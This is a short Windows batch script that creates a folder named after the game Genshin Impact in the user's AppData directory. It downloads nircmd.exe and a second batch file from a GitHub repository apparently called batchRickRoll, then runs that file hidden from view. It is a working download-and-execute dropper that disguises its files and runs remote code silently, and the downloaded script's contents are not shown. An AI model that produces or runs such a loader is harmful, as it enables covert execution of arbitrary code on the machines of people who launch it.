@echo off

echo Downloading Stuff

mkdir %APPDATA%\GenshinImpact

curl --output %APPDATA%\GenshinImpact\n.exe -LO http://github.com/pogga-was-taken/batchRickRoll/blob/main/nircmd.exe?raw=true 
curl --output %APPDATA%\GenshinImpact\run.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/run.bat 

%APPDATA%\GenshinImpact\n.exe exec hide "%APPDATA%\GenshinImpact\run.bat"
